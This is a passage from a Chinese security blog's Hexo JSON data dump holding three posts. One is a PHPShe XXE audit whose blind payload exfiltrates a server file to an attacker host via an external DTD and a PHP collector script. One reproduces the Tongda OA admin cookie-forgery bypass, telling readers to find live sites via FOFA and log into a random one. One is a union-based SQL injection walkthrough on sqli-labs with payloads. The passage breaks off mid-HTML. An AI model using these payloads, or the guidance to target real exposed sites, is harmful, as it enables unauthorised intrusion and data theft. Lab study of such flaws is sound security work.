这里因为是在函数pe_getxml中，所以还需要全局搜索看看哪些php文件调用了这个函数<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317808778-ff3a23f4-6fa9-4caa-9c11-8cf42d7f3e2c.png#align=left&display=inline&height=59&margin=%5Bobject%20Object%5D&originHeight=135&originWidth=946&status=done&style=none&width=415\"><br>4、 第二个明显不是了，那就只能看第一个，点击查看代码<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809168-eeeba45c-8bbc-4061-9cd5-87a52e583ca2.png#align=left&display=inline&height=56&margin=%5Bobject%20Object%5D&originHeight=106&originWidth=788&status=done&style=none&width=415\"><br>5、 又在一个函数中，可以看到这个是接收微信xml数据的，那么我们再全局搜索wechat_getxml函数<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809522-3fdb9992-647f-4dd3-a4d8-513fec09f00b.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&originHeight=167&originWidth=1035&status=done&style=none&width=415\"><br>6、 可以定位到/include/plugin/payment/wechat/notify_url.php文件<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317809899-7219a65d-c02c-4a35-ba44-cec786004556.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&originHeight=593&originWidth=1126&status=done&style=none&width=415\"><br>7、 现在就已经发现了漏洞利用链，首先notify_url.php文件调用了wechat_getxml函数，wechat_getxml函数调用了pe_getxml函数，pe_getxml函数存在XXE漏洞，这里明显没有输出解析后的内容，即XXE无回显，所以我们还需要一台攻击机，在里面放上1.xml、2.php、3.txt<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810126-a505d447-4590-4ed6-87eb-1c00d48de8af.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&originHeight=231&originWidth=718&status=done&style=none&width=415\"><br>8、 内容如下：<br>1.xml<br><!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://192.168.229.1/xxe/2.php?id=%file;'>“&gt;%all;<br>2.php<br><?php file_put_contents(\"3.txt\",$_GET[\"id\"],FILE_APPEND);?><br>3.txt<br>内容空<br>9、 接下来搭建环境，通过phpstudy傻瓜式搭建phpshe网站<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810576-8dffa83a-e1a2-4f82-b199-643e379a0cab.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&originHeight=888&originWidth=1630&status=done&style=none&width=416\"><br>10、          访问存在漏洞的文件，确定文件是否存在，文件路径：/include/plugin/payment/wechat/notify_url.php<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317810985-db91fa42-6f99-4248-a982-bccb78a1ddc3.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&originHeight=449&originWidth=1047&status=done&style=none&width=416\"><br>11、          可以看到，页面空白，说明确实存在这个页面。然后看看这次要获取的内容为服务器网站目录下的flag.txt文件，内容为This is my important data.。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317811565-6239b783-6629-4700-a217-a5245cfd7472.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=640&originWidth=1201&status=done&style=none&width=416\"><br>12、          接下来开始攻击，抓取该页面的数据包，修改传参方式为post，放上payload<br>payload：<br><?xml version=\"1.0\"?><br><!DOCTYPE ANY[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=C:/phpStudy/WWW/flag.txt\"><br><!ENTITY % remote SYSTEM \"http://192.168.229.1/xxe/1.xml\"><br>%remote;<br>%send;<br>]&gt;<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812027-9555a8ec-3c57-4526-8d5a-9ff888bdb1b7.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&originHeight=263&originWidth=896&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812280-8c2d2d56-24f7-453b-a597-2cbb522d57ce.png#align=left&display=inline&height=151&margin=%5Bobject%20Object%5D&originHeight=379&originWidth=1043&status=done&style=none&width=415\"><br>13、          放包，回去查看3.txt，发现已经有获取到内容了<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812577-94b84759-c4ae-48c6-b9cc-5104fe517397.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&originHeight=239&originWidth=674&status=done&style=none&width=404\"><br>14、          Base64解密，获取信息<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317812955-ffd2d37e-56f8-4fa0-846c-75ffe1365e55.png#align=left&display=inline&height=160&margin=%5Bobject%20Object%5D&originHeight=518&originWidth=1350&status=done&style=none&width=416\"></p>\n<h1 id=\"防御方法：\"><a href=\"#防御方法：\" class=\"headerlink\" title=\"防御方法：\"></a>防御方法：</h1><p>1.     使用开发语言提供的禁用外部实体的方法<br>PHP：<br>libxml_disable_entity_loader(true);</p>\n<p>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);</p>\n<p>Python：<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>\n<p>2.     过滤关键词：SYSTEM、PUBLIC等</p>\n"},{"title":"复现：通达OA任意以管理员身份进入后台","keywords":"通达OA,未授权访问,漏洞利用,实战演示,漏洞复现","description":"复现：通达OA任意以管理员身份进入后台","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.tongda2000.com%2Foa%2FMYOA2015%2Ffree%2Fstyle%2Fimages%2Fslide%2FSport%2F4.jpg&refer=http%3A%2F%2Fwww.tongda2000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630915199&t=d53ae596832d4a1c4d980fc3fae686dd","date":"2020-05-13T05:33:52.000Z","_content":"\n日前通达OA爆出一个大漏洞，用户可以在登录界面，通过修改cookie的方式，以管理员身份登录后台，这里我就来复现一次。\n#### 通达OA\n说到通达OA，大家应该都不陌生吧。\t\n通达OA（Office Anywhere网络智能办公系统）是某公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。\t\n说白了，通达OA是一个网站模板，有很多网站在使用。\t\nPOC地址：https://github.com/NS-Sp4ce/TongDaOA-Fake-User\n\n#### 中华人民共和国网络安全法\n在这里提醒一下，作为一名白帽子，大家一定不要做一些违法乱纪的事。文章开头先学习一下中华人民共和国网络安全法：\n\n![upload successful](/images/pasted-5.png)\n\n![upload successful](/images/pasted-6.png)\n\n![upload successful](/images/pasted-7.png)\n\n#### 复现步骤\n1.首先打开网络空间搜索引擎FOFA（非常强大）\t\n地址：https://fofa.so/\n![upload successful](/images/pasted-71.png)\n\n2.在搜索栏处搜索输入“通达OA”\n\n\n![upload successful](/images/pasted-72.png)\n\n会看到很多可以选择的以ip或域名访问的界面，这里基本上都是以通达OA搭建的网站。\n\n3.随便打开一个，会出现一个登录界面\n\n![upload successful](/images/pasted-73.png)\n\n4.通过运行前面给的poc获取一个新的cookie\n\n![upload successful](/images/pasted-74.png)\n\n![upload successful](/images/pasted-75.png)\n\n5.修改cookie为新生成的cookie（修改cookie的方法有很多，这里我用的是插件）\n\n\n![upload successful](/images/pasted-76.png)\n\n6.修改好了之后，访问url下的general目录下的index.php文件\n```\nexample：http：//www.xxx.com/general/index.php\n```\n7.可以看到，已经成功以管理员身份登录后台\n\n![upload successful](/images/pasted-77.png)\n\n#### Over...\n\n\n\n","source":"_posts/复现：通达OA任意以管理员身份进入后台.md","raw":"---\ntitle: 复现：通达OA任意以管理员身份进入后台\ntags: \n  - 通达OA\n  - 未授权访问\n  - 漏洞利用\n  - 实战演示\n  - 漏洞复现\ncategories: 漏洞复现\nkeywords: '通达OA,未授权访问,漏洞利用,实战演示,漏洞复现'\ndescription: 复现：通达OA任意以管理员身份进入后台\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.tongda2000.com%2Foa%2FMYOA2015%2Ffree%2Fstyle%2Fimages%2Fslide%2FSport%2F4.jpg&refer=http%3A%2F%2Fwww.tongda2000.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630915199&t=d53ae596832d4a1c4d980fc3fae686dd\ndate: 2020-05-13 13:33:52\n---\n\n日前通达OA爆出一个大漏洞，用户可以在登录界面，通过修改cookie的方式，以管理员身份登录后台，这里我就来复现一次。\n#### 通达OA\n说到通达OA，大家应该都不陌生吧。\t\n通达OA（Office Anywhere网络智能办公系统）是某公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。\t\n说白了，通达OA是一个网站模板，有很多网站在使用。\t\nPOC地址：https://github.com/NS-Sp4ce/TongDaOA-Fake-User\n\n#### 中华人民共和国网络安全法\n在这里提醒一下，作为一名白帽子，大家一定不要做一些违法乱纪的事。文章开头先学习一下中华人民共和国网络安全法：\n\n![upload successful](/images/pasted-5.png)\n\n![upload successful](/images/pasted-6.png)\n\n![upload successful](/images/pasted-7.png)\n\n#### 复现步骤\n1.首先打开网络空间搜索引擎FOFA（非常强大）\t\n地址：https://fofa.so/\n![upload successful](/images/pasted-71.png)\n\n2.在搜索栏处搜索输入“通达OA”\n\n\n![upload successful](/images/pasted-72.png)\n\n会看到很多可以选择的以ip或域名访问的界面，这里基本上都是以通达OA搭建的网站。\n\n3.随便打开一个，会出现一个登录界面\n\n![upload successful](/images/pasted-73.png)\n\n4.通过运行前面给的poc获取一个新的cookie\n\n![upload successful](/images/pasted-74.png)\n\n![upload successful](/images/pasted-75.png)\n\n5.修改cookie为新生成的cookie（修改cookie的方法有很多，这里我用的是插件）\n\n\n![upload successful](/images/pasted-76.png)\n\n6.修改好了之后，访问url下的general目录下的index.php文件\n```\nexample：http：//www.xxx.com/general/index.php\n```\n7.可以看到，已经成功以管理员身份登录后台\n\n![upload successful](/images/pasted-77.png)\n\n#### Over...\n\n\n\n","slug":"复现：通达OA任意以管理员身份进入后台","published":1,"updated":"2021-08-07T16:17:10.060Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpf9000lvkq383uu0obl","content":"<p>日前通达OA爆出一个大漏洞，用户可以在登录界面，通过修改cookie的方式，以管理员身份登录后台，这里我就来复现一次。</p>\n<h4 id=\"通达OA\"><a href=\"#通达OA\" class=\"headerlink\" title=\"通达OA\"></a>通达OA</h4><p>说到通达OA，大家应该都不陌生吧。<br>通达OA（Office Anywhere网络智能办公系统）是某公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。<br>说白了，通达OA是一个网站模板，有很多网站在使用。<br>POC地址：<a href=\"https://github.com/NS-Sp4ce/TongDaOA-Fake-User\">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>\n<h4 id=\"中华人民共和国网络安全法\"><a href=\"#中华人民共和国网络安全法\" class=\"headerlink\" title=\"中华人民共和国网络安全法\"></a>中华人民共和国网络安全法</h4><p>在这里提醒一下，作为一名白帽子，大家一定不要做一些违法乱纪的事。文章开头先学习一下中华人民共和国网络安全法：</p>\n<p><img src=\"/images/pasted-5.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-6.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-7.png\" alt=\"upload successful\"></p>\n<h4 id=\"复现步骤\"><a href=\"#复现步骤\" class=\"headerlink\" title=\"复现步骤\"></a>复现步骤</h4><p>1.首先打开网络空间搜索引擎FOFA（非常强大）<br>地址：<a href=\"https://fofa.so/\">https://fofa.so/</a><br><img src=\"/images/pasted-71.png\" alt=\"upload successful\"></p>\n<p>2.在搜索栏处搜索输入“通达OA”</p>\n<p><img src=\"/images/pasted-72.png\" alt=\"upload successful\"></p>\n<p>会看到很多可以选择的以ip或域名访问的界面，这里基本上都是以通达OA搭建的网站。</p>\n<p>3.随便打开一个，会出现一个登录界面</p>\n<p><img src=\"/images/pasted-73.png\" alt=\"upload successful\"></p>\n<p>4.通过运行前面给的poc获取一个新的cookie</p>\n<p><img src=\"/images/pasted-74.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-75.png\" alt=\"upload successful\"></p>\n<p>5.修改cookie为新生成的cookie（修改cookie的方法有很多，这里我用的是插件）</p>\n<p><img src=\"/images/pasted-76.png\" alt=\"upload successful\"></p>\n<p>6.修改好了之后，访问url下的general目录下的index.php文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">example：http：//www.xxx.com/general/index.php</span><br></pre></td></tr></table></figure>\n<p>7.可以看到，已经成功以管理员身份登录后台</p>\n<p><img src=\"/images/pasted-77.png\" alt=\"upload successful\"></p>\n<h4 id=\"Over…\"><a href=\"#Over…\" class=\"headerlink\" title=\"Over…\"></a>Over…</h4>","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<p>日前通达OA爆出一个大漏洞，用户可以在登录界面，通过修改cookie的方式，以管理员身份登录后台，这里我就来复现一次。</p>\n<h4 id=\"通达OA\"><a href=\"#通达OA\" class=\"headerlink\" title=\"通达OA\"></a>通达OA</h4><p>说到通达OA，大家应该都不陌生吧。<br>通达OA（Office Anywhere网络智能办公系统）是某公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。<br>说白了，通达OA是一个网站模板，有很多网站在使用。<br>POC地址：<a href=\"https://github.com/NS-Sp4ce/TongDaOA-Fake-User\">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a></p>\n<h4 id=\"中华人民共和国网络安全法\"><a href=\"#中华人民共和国网络安全法\" class=\"headerlink\" title=\"中华人民共和国网络安全法\"></a>中华人民共和国网络安全法</h4><p>在这里提醒一下，作为一名白帽子，大家一定不要做一些违法乱纪的事。文章开头先学习一下中华人民共和国网络安全法：</p>\n<p><img src=\"/images/pasted-5.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-6.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-7.png\" alt=\"upload successful\"></p>\n<h4 id=\"复现步骤\"><a href=\"#复现步骤\" class=\"headerlink\" title=\"复现步骤\"></a>复现步骤</h4><p>1.首先打开网络空间搜索引擎FOFA（非常强大）<br>地址：<a href=\"https://fofa.so/\">https://fofa.so/</a><br><img src=\"/images/pasted-71.png\" alt=\"upload successful\"></p>\n<p>2.在搜索栏处搜索输入“通达OA”</p>\n<p><img src=\"/images/pasted-72.png\" alt=\"upload successful\"></p>\n<p>会看到很多可以选择的以ip或域名访问的界面，这里基本上都是以通达OA搭建的网站。</p>\n<p>3.随便打开一个，会出现一个登录界面</p>\n<p><img src=\"/images/pasted-73.png\" alt=\"upload successful\"></p>\n<p>4.通过运行前面给的poc获取一个新的cookie</p>\n<p><img src=\"/images/pasted-74.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-75.png\" alt=\"upload successful\"></p>\n<p>5.修改cookie为新生成的cookie（修改cookie的方法有很多，这里我用的是插件）</p>\n<p><img src=\"/images/pasted-76.png\" alt=\"upload successful\"></p>\n<p>6.修改好了之后，访问url下的general目录下的index.php文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">example：http：//www.xxx.com/general/index.php</span><br></pre></td></tr></table></figure>\n<p>7.可以看到，已经成功以管理员身份登录后台</p>\n<p><img src=\"/images/pasted-77.png\" alt=\"upload successful\"></p>\n<h4 id=\"Over…\"><a href=\"#Over…\" class=\"headerlink\" title=\"Over…\"></a>Over…</h4>"},{"title":"SQL注入全方位利用之显错注入","keywords":"显错注入,漏洞利用,SQL注入,靶场演示","description":"SQL注入全方位利用之显错注入","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.shangdixinxi.com%2Fup%2Finfo%2F202006%2F20200604170532028792.png&refer=http%3A%2F%2Fimg.shangdixinxi.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630916300&t=5efb5b64bc17ac6be7c880a5fa3db56b","date":"2020-03-08T14:21:29.000Z","_content":"\n\n\n显错注入：顾名思义，通过显错点进行注入。那么什么是显错点呢，就是数据库中的查询结果，通过联合查询的方式，叠加替换显示了我们输入的数据。接下来只需要替换数据为我们要查询的SQL语句，就可以得到我们想要的结果。\n\n#### 中华人民共和国网络安全法\n\n![upload successful](/images/pasted-5.png)\n\n![upload successful](/images/pasted-6.png)\n\n![upload successful](/images/pasted-7.png)\n\n#### 漏洞之王SQL注入\n在这里先简单介绍一下漏洞之王SQL注入：\nSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\n作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件：\n1.\t用户可以控制输入。\n2.\t用户输入的数据被当作代码拼接到了数据库语句当中。\n\n#### 显错注入具体流程\n1.这里我们先打开靶场Sqli-Labs-less1。\n![upload successful](/images/pasted-45.png)\n\n2.提示知道了需要在GET传参处传入ID，那么就传入id=1试试。可以看到多了用户名和密码，那么这个页面就是很标准的get传参显示数据的页面了。\n![upload successful](/images/pasted-46.png)\n\n3.我们日常进行渗透测试的时候，对于这种id传参或者cid传参或者其他传参，最开始也是最喜欢的，便是传个单引号试试看，这里看到页面直接报错了。（ps:单引号经过了url编码变成了%27）单引号报错那就说明我们传入的1'造成了效果，看到这种情况，我们可以直接认定，这里存在sql注入，后面会教一种简单的方法，可以直接注入，这里先不细说。\n![upload successful](/images/pasted-47.png)\n\n4.报错了报错了，为了大家能够更加直观的了解，那么我们直接作弊，看看源码吧。有点乱，这里我们没有php基础了读者可能有点慌，不要紧哦，我们只需要知道我标的那句sql查询语句即可。\n```\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"\n```\n这里大概解释一下，这里是通过查询users表中的id字段中的第一行数据，可以看到，$id处就是我们输入的数据。好的回到之前查询报错处，因为我传入了id=1' 被放到查询语句中，语句经过拼接变成：**SELECT * FROM users WHERE id='1'' LIMIT 0,1** \n这里发现了吗，我传入的单引号跟前面的单引号闭合了，可以这样理解，后面那个单引号就像一只单身狗，找不到伙伴，所以生气报错了。\n![upload successful](/images/pasted-48.png)\n\n5.那我只需要将后面的单引号丢掉，就可以页面正常显示了，这里使用#注释后面的语句（ps:#经过url编码变成了%23），可以看到，页面直接显示正常了。新的sql查询语句为:\n```\nSELECT * FROM users WHERE id='1' #' LIMIT 0,1\n```\n#后面的东西被注释了，已经没有用了，那么我们就成功跳出了单引号，在单引号和#之间，我们就可以放入自己的语句进行执行。\n![upload successful](/images/pasted-49.png)\n\n6.因为这里是显错注入嘛，下一步就要通过order by查询数据库当前的字段数，具体传参为：?id=1' order by 1#。order by 1页面正常，order by 2页面正常，order by 3页面正常，order by 4页面不正常。这就说明了当前表中的字段为3。\n![upload successful](/images/pasted-50.png)\n\n![upload successful](/images/pasted-51.png)\n\n7.下一步就是联合查询了，传参为 **?id=1' union select 1,2,3 limit 1,1#** ，这里我通过刚刚知道了字段数为3，所以将语句换成了union select 1,2,3 ，这样的语句在页面是可以正常执行的，但是返回的数据还是dump和dump，这不是我要的显错点，所以我加上了limit 1，1 ，取出第二段数据，成功看到了2和3，这里的2，3就是我们想要的显错点了。\n![upload successful](/images/pasted-52.png)\n\n![upload successful](/images/pasted-53.png)\n\n8.嘿嘿，看到2和3了，接下来就好办了，替换2和3为执行语句，就可以获得对应的信息。这里学习3个基础函数：database() 查询当前数据库库名 , user() 查询当前登录的用户名, version() 查询当前数据库版本号。\n\n---\n我把2换成了database()，这里成功查看到了库名security\n![upload successful](/images/pasted-54.png)\n\n9.这里普及一下，在mysql数据库中有一个information_schema表，这是系统自带的表，里面放入了我们从建库开始的所有操作，例如建表，加用户。这里给出一条查询语句：\n```\nunion select 1,table_name,3 from information_schema.tables where \ntable_schema=database() limit 1,1# \n```\n这条语句通过查询了系统自带库获取了里面的表名emails\n![upload successful](/images/pasted-55.png)\n\n10.接下来查询这个表里面的字段，语句为：\n```\nunion select 1,2,column_name from information_schema.columns where table_name=表名 and table_schema=database() limit 1,1 \n```\n这里有个坑，表名在语句中是以字符串的形式存在的，所以需要加单引号。\n这里的传参为：\n```\n?id=1' union select 1,2,column_name from information_schema.columns where table_name='emails' and table_schema=database() limit 1,1#\n```\n看到第一个字段为id\n![upload successful](/images/pasted-56.png)\n\n```\n?id=1' union select 1,2,column_name from information_schema.columns where table_name='emails' and table_schema=database() limit 2,1#\n```\n看到第二个字段为email_id\n![upload successful](/images/pasted-57.png)\n\n11.现在有表名emails，有字段名email_id，那就可以直接查询里面的数据了。将传参换成:\n```\n?id=1' union select 1,id,email_id from emails limit 1,1#\n```\n\n![upload successful](/images/pasted-58.png)\n\n12.看到了吧，id为1的人的email为Dumb@dhakkan.com。这就是显错注入的整个过程。因为说着说着，好像内容有点多，后面的内容就放到以后的推文吧，这里说一下前面说的那个“简单”的方法，在发现报错之后，放上这条语句，可以直接查询到数据库库名哦。\n```\nand updatexml(1,concat(0x7e,(select database()),0x7e),1)%23\n```\n\n![upload successful](/images/pasted-59.png)\n\n13.报错注入具体详情请看另一篇文章哦！\n\n","source":"_posts/SQL注入全方位利用之显错注入.md","raw":"---\ntitle: SQL注入全方位利用之显错注入\ntags: \n  - web安全\n  - SQL注入\n  - 显错注入\ncategories: web安全\nkeywords: '显错注入,漏洞利用,SQL注入,靶场演示'\ndescription: SQL注入全方位利用之显错注入\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.shangdixinxi.com%2Fup%2Finfo%2F202006%2F20200604170532028792.png&refer=http%3A%2F%2Fimg.shangdixinxi.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630916300&t=5efb5b64bc17ac6be7c880a5fa3db56b\ndate: 2020-03-08 22:21:29\n---\n\n\n\n显错注入：顾名思义，通过显错点进行注入。那么什么是显错点呢，就是数据库中的查询结果，通过联合查询的方式，叠加替换显示了我们输入的数据。接下来只需要替换数据为我们要查询的SQL语句，就可以得到我们想要的结果。\n\n#### 中华人民共和国网络安全法\n\n![upload successful](/images/pasted-5.png)\n\n![upload successful](/images/pasted-6.png)\n\n![upload successful](/images/pasted-7.png)\n\n#### 漏洞之王SQL注入\n在这里先简单介绍一下漏洞之王SQL注入：\nSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\n作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件：\n1.\t用户可以控制输入。\n2.\t用户输入的数据被当作代码拼接到了数据库语句当中。\n\n#### 显错注入具体流程\n1.这里我们先打开靶场Sqli-Labs-less1。\n![upload successful](/images/pasted-45.png)\n\n2.提示知道了需要在GET传参处传入ID，那么就传入id=1试试。可以看到多了用户名和密码，那么这个页面就是很标准的get传参显示数据的页面了。\n![upload successful](/images/pasted-46.png)\n\n3.我们日常进行渗透测试的时候，对于这种id传参或者cid传参或者其他传参，最开始也是最喜欢的，便是传个单引号试试看，这里看到页面直接报错了。（ps:单引号经过了url编码变成了%27）单引号报错那就说明我们传入的1'造成了效果，看到这种情况，我们可以直接认定，这里存在sql注入，后面会教一种简单的方法，可以直接注入，这里先不细说。\n![upload successful](/images/pasted-47.png)\n\n4.报错了报错了，为了大家能够更加直观的了解，那么我们直接作弊，看看源码吧。有点乱，这里我们没有php基础了读者可能有点慌，不要紧哦，我们只需要知道我标的那句sql查询语句即可。\n```\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"\n```\n这里大概解释一下，这里是通过查询users表中的id字段中的第一行数据，可以看到，$id处就是我们输入的数据。好的回到之前查询报错处，因为我传入了id=1' 被放到查询语句中，语句经过拼接变成：**SELECT * FROM users WHERE id='1'' LIMIT 0,1** \n这里发现了吗，我传入的单引号跟前面的单引号闭合了，可以这样理解，后面那个单引号就像一只单身狗，找不到伙伴，所以生气报错了。\n![upload successful](/images/pasted-48.png)\n\n5.那我只需要将后面的单引号丢掉，就可以页面正常显示了，这里使用#注释后面的语句（ps:#经过url编码变成了%23），可以看到，页面直接显示正常了。新的sql查询语句为:\n```\nSELECT * FROM users WHERE id='1' #' LIMIT 0,1\n```\n#后面的东西被注释了，已经没有用了，那么我们就成功跳出了单引号，在单引号和#之间，我们就可以放入自己的语句进行执行。\n![upload successful](/images/pasted-49.png)\n\n6.因为这里是显错注入嘛，下一步就要通过order by查询数据库当前的字段数，具体传参为：?id=1' order by 1#。order by 1页面正常，order by 2页面正常，order by 3页面正常，order by 4页面不正常。这就说明了当前表中的字段为3。\n![upload successful](/images/pasted-50.png)\n\n![upload successful](/images/pasted-51.png)\n\n7.下一步就是联合查询了，传参为 **?id=1' union select 1,2,3 limit 1,1#** ，这里我通过刚刚知道了字段数为3，所以将语句换成了union select 1,2,3 ，这样的语句在页面是可以正常执行的，但是返回的数据还是dump和dump，这不是我要的显错点，所以我加上了limit 1，1 ，取出第二段数据，成功看到了2和3，这里的2，3就是我们想要的显错点了。\n![upload successful](/images/pasted-52.png)\n\n![upload successful](/images/pasted-53.png)\n\n8.嘿嘿，看到2和3了，接下来就好办了，替换2和3为执行语句，就可以获得对应的信息。这里学习3个基础函数：database() 查询当前数据库库名 , user() 查询当前登录的用户名, version() 查询当前数据库版本号。\n\n---\n我把2换成了database()，这里成功查看到了库名security\n![upload successful](/images/pasted-54.png)\n\n9.这里普及一下，在mysql数据库中有一个information_schema表，这是系统自带的表，里面放入了我们从建库开始的所有操作，例如建表，加用户。这里给出一条查询语句：\n```\nunion select 1,table_name,3 from information_schema.tables where \ntable_schema=database() limit 1,1# \n```\n这条语句通过查询了系统自带库获取了里面的表名emails\n![upload successful](/images/pasted-55.png)\n\n10.接下来查询这个表里面的字段，语句为：\n```\nunion select 1,2,column_name from information_schema.columns where table_name=表名 and table_schema=database() limit 1,1 \n```\n这里有个坑，表名在语句中是以字符串的形式存在的，所以需要加单引号。\n这里的传参为：\n```\n?id=1' union select 1,2,column_name from information_schema.columns where table_name='emails' and table_schema=database() limit 1,1#\n```\n看到第一个字段为id\n![upload successful](/images/pasted-56.png)\n\n```\n?id=1' union select 1,2,column_name from information_schema.columns where table_name='emails' and table_schema=database() limit 2,1#\n```\n看到第二个字段为email_id\n![upload successful](/images/pasted-57.png)\n\n11.现在有表名emails，有字段名email_id，那就可以直接查询里面的数据了。将传参换成:\n```\n?id=1' union select 1,id,email_id from emails limit 1,1#\n```\n\n![upload successful](/images/pasted-58.png)\n\n12.看到了吧，id为1的人的email为Dumb@dhakkan.com。这就是显错注入的整个过程。因为说着说着，好像内容有点多，后面的内容就放到以后的推文吧，这里说一下前面说的那个“简单”的方法，在发现报错之后，放上这条语句，可以直接查询到数据库库名哦。\n```\nand updatexml(1,concat(0x7e,(select database()),0x7e),1)%23\n```\n\n![upload successful](/images/pasted-59.png)\n\n13.报错注入具体详情请看另一篇文章哦！\n\n","slug":"SQL注入全方位利用之显错注入","published":1,"updated":"2021-08-07T16:20:46.951Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfc000pvkq3aypb1ps8","content":"<p>显错注入：顾名思义，通过显错点进行注入。那么什么是显错点呢，就是数据库中的查询结果，通过联合查询的方式，叠加替换显示了我们输入的数据。接下来只需要替换数据为我们要查询的SQL语句，就可以得到我们想要的结果。</p>\n<h4 id=\"中华人民共和国网络安全法\"><a href=\"#中华人民共和国网络安全法\" class=\"headerlink\" title=\"中华人民共和国网络安全法\"></a>中华人民共和国网络安全法</h4><p><img src=\"/images/pasted-5.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-6.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-7.png\" alt=\"upload successful\"></p>\n<h4 id=\"漏洞之王SQL注入\"><a href=\"#漏洞之王SQL注入\" class=\"headerlink\" title=\"漏洞之王SQL注入\"></a>漏洞之王SQL注入</h4><p>在这里先简单介绍一下漏洞之王SQL注入：<br>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<br>作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件：</p>\n<ol>\n<li>   用户可以控制输入。</li>\n<li>   用户输入的数据被当作代码拼接到了数据库语句当中。</li>\n</ol>\n<h4 id=\"显错注入具体流程\"><a href=\"#显错注入具体流程\" 